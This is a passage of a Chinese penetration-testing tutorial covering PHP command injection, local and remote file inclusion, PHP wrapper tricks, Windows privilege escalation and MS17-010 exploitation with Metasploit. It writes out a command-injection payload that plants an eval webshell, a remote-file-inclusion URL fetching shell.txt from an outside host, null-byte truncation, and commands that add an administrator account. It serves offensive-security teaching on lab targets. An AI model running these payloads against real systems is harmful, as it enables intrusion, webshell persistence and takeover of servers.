<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    常用的读文件函数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525320678.39929.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525320701.3200238.png" alt=""></p>
<h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><p>&emsp;&emsp;常见的代码执行函数除了案例中所用到的eval函数还有以下函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">assert()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">create_function()</span><br><span class="line">preg_replace (with /e modifier)</span><br></pre></td></tr></table></figure>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>&emsp;&emsp;命令执行和代码执行是不一样的，命令执行漏洞(也称为命令注入)是程序未对用户提交的字符串进行过滤，而直接将字符串当作<strong>系统命令</strong>来执行的漏洞，而代码执行是将字符串作为脚本代码执行的。</p>
<p>&emsp;&emsp;命令执行漏洞允许攻击者以Web容器的权限执行任意命令，如果站点权限配置不当，容器权限过高的话，攻击者则可以直接拿到服务器权限。</p>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器 ：win+phpstudy</span><br><span class="line">程序 ： DVWA Command Injection</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;DVWA Command Injection模块是一个ping功能的实现，其执行的命令是ping IP，IP是可控的，攻击者可以构造payload：<code>IP&amp;whomai</code> 来使<code>ping</code>命令和<code>whomai</code>命令一起执行，在系统命令中&amp;是两个命令的连接符号。</p>
<h3 id="执行任意命令"><a href="#执行任意命令" class="headerlink" title="执行任意命令"></a>执行任意命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;command</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525323176.649364.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525323209.1942801.png" alt=""></p>
<p>&emsp;&emsp;出现乱码的原因是DVWA的编码是UTF8而win的命令行编码是GBK，以UTF8格式显示GBK因此是乱码。</p>
<h3 id="写SHELL"><a href="#写SHELL" class="headerlink" title="写SHELL"></a>写SHELL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;echo &quot;&lt;?php eval($_POST[x]);?&gt;&quot;&gt;绝对路径</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525324119.036375.png" alt=""></p>
<p><strong>注意：</strong></p>
<ul>
<li><p>1.写shell时候必须用双引号包裹shell内容(单引号不行)，否则会报错。</p>
</li>
<li><p>2.需要知道网站目录的绝对路径</p>
</li>
</ul>
<h3 id="CMD下载文件"><a href="#CMD下载文件" class="headerlink" title="CMD下载文件"></a>CMD下载文件</h3><h3 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">exec</span><br><span class="line">popen</span><br><span class="line">`  <span class="comment">//反引号</span></span><br><span class="line">pcntl_exec</span><br><span class="line">shell_exec</span><br><span class="line">passthru</span><br><span class="line">proc_open</span><br></pre></td></tr></table></figure>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>&emsp;&emsp;文件包含可以直接执行包含文件的代码，包含的文件格式是不受限制的，只要能正常执行即可。文件包含又分为本地文件包含(Local file include)和远程文件包含(Rmote file include)，不管是哪种都是非常高危的，渗透过程中文件包含漏洞大多可以直接利用获取webshell。文件包含的函数有：<code>include()</code>,<code>include_once()</code>,<code>require</code>,<code>require_once()</code>，它们之间的区别在于： <code>include()</code>和<code>include_once()</code>在包含文件时即使遇到错误，下面的代码依然会执行；而<code>require()</code>和<code>require_once()</code>则会直接报错退出程序。</p>
<h3 id="本地文件包含LFI"><a href="#本地文件包含LFI" class="headerlink" title="本地文件包含LFI"></a>本地文件包含LFI</h3><p>&emsp;&emsp;顾名思义就是就是包含本地的文件。</p>
<h4 id="配合上传利用"><a href="#配合上传利用" class="headerlink" title="配合上传利用"></a>配合上传利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">环境：phpstudy</span><br><span class="line">程序：DVWA的上传点+本地文件包含</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在实际的渗透环境中，有很多上传点无法突破，但是攻击者可以利用上传点配合本地包含漏洞获取webshell。</p>
<p>&emsp;&emsp;第一步：上传图片马，并记录图片的路径。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525406915.6639082.png" alt=""></p>
<p>&emsp;&emsp;第二步：利用文件包含漏洞包含图片马</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525407033.314643.png" alt=""></p>
<h4 id="配合Apache日志利用"><a href="#配合Apache日志利用" class="headerlink" title="配合Apache日志利用"></a>配合Apache日志利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">环境：phpstudy</span><br><span class="line">程序：本地文件包含(无上传点)</span><br><span class="line">信息：已知Apache绝对路径</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;第一步：将webshell代码写在URL中，抓包访问，这里我们以<code>phpinfo();</code>作为演示。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525409368.9184.png" alt=""></p>
<p>&emsp;&emsp;<strong>注意</strong>：在数据包中要对webshell代码进行<code>urldecode</code>操作，否则被记录到日志中的webshell代码是编码后的。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525409633.7168415.png" alt=""></p>
<p>&emsp;&emsp;第二步：包含日志文件获取webshell，可以包含<code>access.log</code>也可以包含<code>error.log</code>，此两者均存放在<code>apache/logs/</code>目录下。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525409809.4507136.png" alt=""></p>
<h3 id="远程文件包含RFI"><a href="#远程文件包含RFI" class="headerlink" title="远程文件包含RFI"></a>远程文件包含RFI</h3><p>&emsp;&emsp;远程文件包含是指可以包含远程文件的包含漏洞，远程文件包含需要设置<code>allow_url_include = On</code>和<code>allow_url_fopen = On</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">环境：phpstudy</span><br><span class="line">程序：本地文件包含(无上传点)</span><br><span class="line">php.ini：allow_url_include = On</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileinclude/include.php?page=http://47.95.206.199:8080/shell.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525411170.7676942.png" alt=""></p>
<h3 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h3><p>&emsp;&emsp;大多数的文件包含漏洞都是需要截断的，因为正常的程序里面文件包含的代码一般是<code>include($page.&#39;.php&#39;);</code>这样的方式，而我们不能写入以<code>.php</code>为拓展名的文件，那我们是需要截断<code>.php</code>来利用。</p>
<h4 id="00截断-1"><a href="#00截断-1" class="headerlink" title="00截断"></a>00截断</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">环境：php 5.3.29</span><br><span class="line">程序：湖湘杯2017 - web200</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;第一步：找到上传点上传图马，并记录图马的路径</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525411873.2581275.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525412017.067643.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525412074.1603644.png" alt=""></p>
<p>&emsp;&emsp;第二步：截断<code>.php</code>包含图片获得webshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?op=uploads/974c1275f568fbfca418d456f97817a80349fb46.png%00</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525412199.3538043.png" alt=""></p>
<h4 id="和-截断"><a href="#和-截断" class="headerlink" title=".和/截断"></a>.和/截断</h4><p>&emsp;&emsp;%00截断受到PHP版本和GPC的限制，在PHP5.3以后的版本中%00截断已经失效了，所以在这里介绍一个%00的替代方法。</p>
<ul>
<li>在window中240个<code>.</code>可以截断</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525413447.3079183.png" alt=""></p>
<ul>
<li>在linux中2038个<code>/.</code>组合</li>
</ul>
<h4 id="伪截断"><a href="#伪截断" class="headerlink" title="?伪截断"></a>?伪截断</h4><p>&emsp;&emsp;此方法不受GPC和PHP版本影响，但只适用于RFI。在HTTP协议中访问<code>http://47.95.206.199:8080/shell.txt</code>和访问<code>http://47.95.206.199:8080/shell.txt?</code>返回结果是一样的，因为这时候服务器把<code>?</code>之后的内容当成是请求参数，参数对访问shell.txt返回的内容不影响，所以就实现了伪截断。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525414450.783936.png" alt=""></p>
<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>&emsp;&emsp;<code>php://input</code> 是个可以访问请求的原始数据的只读流，它受限于<code>allow_url_include</code>，但<code>allow_url_fopen</code>对其无影响。</p>
<p>&emsp;&emsp;<code>php://input</code>和文件包含的配合只能在<code>include($page);</code>这样的情况下使用，而无法在<code>include($page.&#39;.php&#39;);</code>情况下使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">环境：phpstudy</span><br><span class="line">程序：文件包含测试代码</span><br><span class="line">php.ini：allow_url_include = On</span><br><span class="line">        allow_url_fopen = Off</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525458382.7498868.png" alt=""></p>
<h4 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data:text/plain"></a>data:text/plain</h4><p>&emsp;&emsp;data:text/plain也是个原始数据流，其使用格式为<code>data:text/plain[;编码],数据</code>，和php://input有些类似，受限于<code>allow_url_include</code>，但<code>allow_url_fopen</code>对其无影响。</p>
<p>&emsp;&emsp;<code>data:text/plain</code>协议和文件包含的配合既可以在<code>include($page);</code>这样的情况下使用，也可以在<code>include($page.&#39;.php&#39;);</code>情况下使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">环境：phpstudy</span><br><span class="line">程序：文件包含测试代码</span><br><span class="line">php.ini：allow_url_include = On</span><br><span class="line">        allow_url_fopen = Off</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525458640.8219666.png" alt=""></p>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>&emsp;&emsp;<code>php://filter</code>是PHP过滤器用于对来自非安全来源的数据（比如用户输入）进行验证和过滤。其用法为<code>php://filter/read=convert.base64-encode/resource=[文件路径]</code> ，前面提到的<code>php://input</code>和<code>data://text/plain</code>可以将文件包含漏洞变成代码执行漏洞从而getshell，而<code>php://filter</code>却只能读取任意文件的内容。</p>
<p>&emsp;&emsp;<code>php://filter</code>协议和文件包含的配合既可以在<code>include($page);</code>这样的情况下使用，也可以在<code>include($page.&#39;.php&#39;);</code>情况下使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">环境：php 5.5.38</span><br><span class="line">程序：湖湘杯2017 - web200</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525455752.1811738.png" alt=""></p>
<h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>&emsp;&emsp;<code>phar://</code>是PHP的解压缩协议(<strong>PHP5.3以后增加</strong>)，用法为：<code>phar://zipName/x.php</code>。这个协议不受限于<code>allow_url_fopen</code>和<code>allow_url_include</code>。</p>
<p>&emsp;&emsp;值得一提的是<code>phar://</code>后面的<code>zipName</code>与后缀无关，只要是文件是完整的压缩包即可。</p>
<p>&emsp;&emsp;<code>phar://</code>协议和文件包含的配合既可以在<code>include($page);</code>这样的情况下使用，也可以在<code>include($page.&#39;.php&#39;);</code>情况下使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">环境：php 5.5.38</span><br><span class="line">程序：湖湘杯2017 - web200</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;第一步：将shell.php压缩为zip格式，并更名压缩包为：tuma.png</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525456314.8173006.png" alt=""></p>
<p>&emsp;&emsp;第二步：上传到服务器，并记录上传后的路径</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525456421.338528.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525456521.0313106.png" alt=""></p>
<p>&emsp;&emsp;第三步利用<code>phar://</code>协议获取WEBSHELL</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525457115.7593117.png" alt=""></p>
<p>&emsp;&emsp;和<code>phar://</code>协议类似的还有<code>zip://</code>协议，也是用于解压文件的协议。<code>zip://</code>的用法：<code>zip://zipName绝对路径%23shell.php</code></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525458112.8825183.png" alt=""></p>
<h4 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h4><p>&emsp;&emsp;<code>file://</code>协议是用来访问本地文件系统的协议，用法为：<code>file://绝对路径</code>。此协议不受限于<code>allow_url_fopen</code>和<code>allow_url_include</code>。</p>
<p>&emsp;&emsp;<code>file://</code>协议和文件包含的配合既可以在<code>include($page);</code>这样的情况下使用，也可以在<code>include($page.&#39;.php&#39;);</code>情况下使用。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525457463.3982003.png" alt=""></p>
<h1 id="Windows服务器权限提升"><a href="#Windows服务器权限提升" class="headerlink" title="Windows服务器权限提升"></a>Windows服务器权限提升</h1><p>&emsp;&emsp;通过前面几个章节学到的内容我们已经能够拿到WEBSHELL，但是拿到WEBSHELL以后我们的权限还不算是最大，还可以通过服务器权限提升的方法来将权限提升到一个更高的层次，比如服务器管理员权限Administrator，再比如比管理员权限更高的系统权限System。</p>
<h2 id="提权常用的系统命令"><a href="#提权常用的系统命令" class="headerlink" title="提权常用的系统命令"></a>提权常用的系统命令</h2><ul>
<li><code>whoami</code> 查看cmd当前的权限</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525685227.443042.png" alt=""></p>
<p>&emsp;&emsp;攻击者可以通过该命令查看shell中cmd的权限，如果是Administrator 或者 System权限的话，就可以绕过很多步骤直接添加用户登录服务器了。</p>
<p>&emsp;&emsp;shell中cmd的权限主要受到WEB容器的运行者权限的影响，常见的高权限的案例：<code>phpstudy 套装</code> 和 <code>struct2 运行环境</code>。</p>
<ul>
<li><code>ipconfig</code> 查看服务器IP</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525684080.4596996.png" alt=""></p>
<p>&emsp;&emsp;攻击者通过查看服务器IP，判断服务器是处于内网还是外网，如果是外网的话可以直接连接服务器除WEB端口以外的其他端口，否则需要做端口转发，将内网的端口转发到公网IP才能够连接。</p>
<ul>
<li><code>netstat -ano</code> 查看端口开放情况</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525684179.7121642.png" alt=""></p>
<p>&emsp;&emsp;在前面章节中，我们也提到过探测端口，当时用的方法是端口扫描，现在我们拥有了WEBSHELL以后可以直接使用系统命令来查看开放端口了，效率上比扫描端口快很多。</p>
<p>&emsp;&emsp;在本章探测端口的目的和前面章节也有所不同，本章探测端口的目的主要是以下两点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.确定远程端口的端口号</span><br><span class="line">2.确定服务器上某个特定程序的端口号</span><br><span class="line">3.也可以通过端口号确定服务器上运行的程序</span><br></pre></td></tr></table></figure>
<ul>
<li><code>tasklist /svc</code> 查看进程列表</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525684666.5497127.png" alt=""></p>
<p>&emsp;&emsp;攻击者可以通过查看进程列表来确定服务器上运行的哪些程序，然后再确定进一步的攻击方案。</p>
<ul>
<li><code>systeminfo</code> 查看系统信息及补丁情况</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525685451.3430305.png" alt=""></p>
<p>&emsp;&emsp;攻击者可以通过<code>systeminfo</code>命令得知目标服务器的<code>位数</code>、<code>补丁情况</code>、<code>域</code>等信息。</p>
<ul>
<li>用户相关命令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user # 查看服务器上的用户</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525685798.8727176.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup # 查看服务器上的用户组</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525685902.2289546.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add # 添加用户</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525686102.7989852.png" alt=""></p>
<p>&emsp;&emsp;新添加的用户不能连接远程桌面，只有管理组和远程桌面组的用户才拥有连接远程桌面的权限，而管理组的用户权限比较大，所以攻击者在渗透中常把自己的用户加入管理组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators username /add # 将用户加入管理组</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525686410.037156.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user guest /active:yes # 激活Guest用户</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525686617.7523003.png" alt=""></p>
<p>&emsp;&emsp;在有waf的情况下，添加用户会被拦截，攻击者可以激活Guest用户，然后再赋予该用户权限即可达到相同的效果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user username newpassword # 修改用户的密码</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525686836.9865477.png" alt=""></p>
<p>&emsp;&emsp;<strong>请勿修改服务器上Administrator或者其他管理员帐户的密码，否则后果自负。</strong></p>
<h2 id="提权前的准备工作"><a href="#提权前的准备工作" class="headerlink" title="提权前的准备工作"></a>提权前的准备工作</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
<li>探测支持的脚本类型</li>
</ul>
<p>&emsp;&emsp;在使用本地溢出提权时，重点还是看攻击者是否可执行溢出程序，也就是执行权限。在ASP中依靠“wscript.shell”命令执行组建，而ASPX脚本语言中依靠的是“.NET Framework”，在JSP中却是依靠“JVM”来调用系统命令，各自的实现不同。</p>
<p>&emsp;&emsp;所以，在Windows中进行本地溢出提权时，一般会看服务器所支持的脚本语言(ASP、PHP、ASPX、JSP)。有时服务器支持很多脚本语言，如果其中一个脚本没有执行权限，或许另外一个脚本就可以。</p>
<p>&emsp;&emsp;并且此四类脚本的SHELL的权限从大到小排列：<code>JSP&gt;ASPX&gt;PHP=ASP</code>，由于JSP很多时候以Administrator权限来运行，因此该脚本的shell权限最大；ASPX需要<code>.NET Frameword</code>的支持，而<code>.Net Framework</code>的运行需要一定的权限，因此该脚本的shell权限比较大；PHP和ASP不需要依赖太多的组建，因此该二类脚本的shell权限比较小。</p>
<p>&emsp;&emsp;可以用大马中<code>脚本-探测</code>功能来进行探测，也可以将四种类型的脚本都上传到目标服务器，然后依次访问，不能解析执行的脚本则为不支持。以大马中<code>脚本-探测</code>功能为例，返回解析执行结果的则为支持的脚本。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527091556.2800744.png" alt=""></p>
<ul>
<li>探测可读写可执行目录</li>
</ul>
<p>&emsp;&emsp;要想使用本地溢出的方法提权，那么需要找到可读写的目录将溢出程序上传到目标服务器，溢出程序的执行需要目录拥有可执行权限，所以就需要探测可读可写可执行的目录。</p>
<p>&emsp;&emsp;探测方法：可以直接使用大马中集成的可写目录探测功能来探测，探测结果中蓝色的为可写目录，红色为不可写目录。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527091252.7000275.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1527091285.1697536.png" alt=""></p>
<ul>
<li>能否执行cmd命令</li>
</ul>
<p>&emsp;&emsp;使用默认的cmd(<code>c:\windows\system32\cmd.exe</code>)执行cmd命令，很多时候是拒绝访问如下图所示，原因是iis用户无权限访问<code>c:\windows\system32</code>。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525756403.9272382.png" alt=""></p>
<p>&emsp;&emsp;遇到这种情况，攻击者可以上传一个cmd，然后把cmd的路径设置成自己上传的cmd路径即可执行命令。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525756694.3018162.png" alt=""></p>
<ul>
<li>当前cmd的权限</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525755518.7424433.png" alt=""></p>
<ul>
<li>补丁及系统版本</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525755735.8235443.png" alt=""></p>
<ul>
<li>进程情况</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525755781.6941323.png" alt=""></p>
<ul>
<li>IP</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525755970.7347064.png" alt=""></p>
<ul>
<li>端口情况</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525756200.3839567.png" alt=""></p>
<ul>
<li>是否可以执行net相关命令</li>
</ul>
<p>&emsp;&emsp;如果不能执行，攻击者可以自己上传一个<code>net.exe</code>调用自己上传的<code>net.exe</code>来执行net相关命令，如果上传的<code>net.exe</code>仍无法执行net相关命令，则可以调用<code>win API</code>来执行net相关命令`。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525756950.2133033.png" alt=""></p>
<h3 id="攻击方案制定"><a href="#攻击方案制定" class="headerlink" title="攻击方案制定"></a>攻击方案制定</h3><ul>
<li><p>不能执行cmd时，可以通过端口扫描的方式确定开放端口，再根据端口推断出系统中运行的服务从而制定进一步的攻击方案。</p>
</li>
<li><p>可以执行cmd时，先探测cmd的权限，如果是权限很高那么可以直接添加用户；否则就探测系统版本和补丁情况，确定使用哪个缓冲区溢出EXP及其位数(32 or 64)进行缓冲区溢出提权。</p>
</li>
<li><p>根据端口和进程情况，可以确定目标服务器上是否存在WAF，如果存在WAF则需要绕过WAF；也可以确定服务器运行着哪些数据库，然后选择数据库提权；还可以确定服务器运行着哪些第三方软件，然后选择对应的提权方法。</p>
</li>
<li><p>根据IP情况决定是否需要端口转发等。</p>
</li>
<li><p>根据用户情况，可以选择社工或者爆破的方法拿到权限。</p>
</li>
</ul>
<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><h3 id="本地溢出"><a href="#本地溢出" class="headerlink" title="本地溢出"></a>本地溢出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器：win03</span><br><span class="line">cmd权限：network service</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;第一步：上传并运行缓冲区溢出EXP，一般EXP会提示使用方法。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525757652.7581005.png" alt=""></p>
<p>&emsp;&emsp;第二步：按照EXP提示的使用方法执行命令，查看权限。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525757760.1973763.png" alt=""></p>
<p>&emsp;&emsp;如果权限已经提升到System或者Administrator，则可以进行接下来的添加用户操作，否则可以选择其他缓冲区溢出EXP继续尝试，直到获得System权限。</p>
<p>&emsp;&emsp;第三步：添加用户，并将用户加入管理组。</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525758306.6971972.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525758353.3388336.png" alt=""></p>
<p>&emsp;&emsp;第四步：远程桌面连接</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525758441.43973.png" alt=""></p>
<p>&emsp;&emsp;打开Windows自带的<code>mstsc</code>(Win+R打开运行输入mstsc回车)，出现以下界面，如果是目标服务器远程端口是默认3389端口那么可以只填写IP不填写端口，否则需要填写<code>IP:PORT</code></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525758499.5474555.png" alt=""></p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1525758712.9841862.png" alt=""></p>
<p><strong>经验之谈：</strong></p>
<p>&emsp;&emsp;在选择本地溢出EXP的时候有以下几个参考点:</p>
<ul>
<li><p>根据打补丁情况选择，可以用笔者的工具<a href="https://pan.baidu.com/s/19gyum1VfEv1JEw_xTEkmwA" target="_blank" rel="noopener">ATRoot Auxiliary</a>来查看未打补丁的溢出漏洞有哪些，再去使用未补的漏洞提权</p>
</li>
<li><p>尽量使用通杀Win的本地溢出EXP，比如MS15051、MS16016等</p>
</li>
<li><p>根据系统版本选择本地溢出EXP，如：win03则可以选择PR或iis6的远程溢出</p>
</li>
</ul>
<h3 id="远程溢出"><a href="#远程溢出" class="headerlink" title="远程溢出"></a>远程溢出</h3><p>&emsp;&emsp;远程溢出我们以MS17010和IIS6远程代码执行作为案例来做演示。</p>
<h4 id="MS17010"><a href="#MS17010" class="headerlink" title="MS17010"></a>MS17010</h4><p>&emsp;&emsp;MS17010有很多图形化界面工具，也可以用Metasploit来进行攻击，这里我们以Metasploit(后文称MSF)作为攻击演示工具</p>
<ul>
<li>1.MSF搜索MS17010模块</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1526486246.8418982.png" alt=""></p>
<p>&emsp;&emsp;这里MSF提供的模块有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/smb/ms17_010_command # 执行单条CMD命令</span><br><span class="line">auxiliary/scanner/smb/smb_ms17_010   # 扫描漏洞，可批量</span><br><span class="line">exploit/windows/smb/ms17_010_eternalblue # 永恒之蓝版本,适用WIN7和Win2008(x64)</span><br><span class="line">exploit/windows/smb/ms17_010_psexec # 最新MS17010，适用面广</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;Win版本和模块的选择(数据来自T00ls)：</p>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1526542926.4927104.png" alt=""></p>
<ul>
<li>2.扫描漏洞</li>
</ul>
<p><img src="https://blog-1252108140.cosbj.myqcloud.com/201805/1526486846.1066036.png" alt=""></p>
<p>&emsp;&emsp;如果需要扫描一个网段则<code>RHOSTS</code>设置为<code>192.168.19.1/24</code></p>
<ul>
<li>3.利用漏洞</li>
</ul>
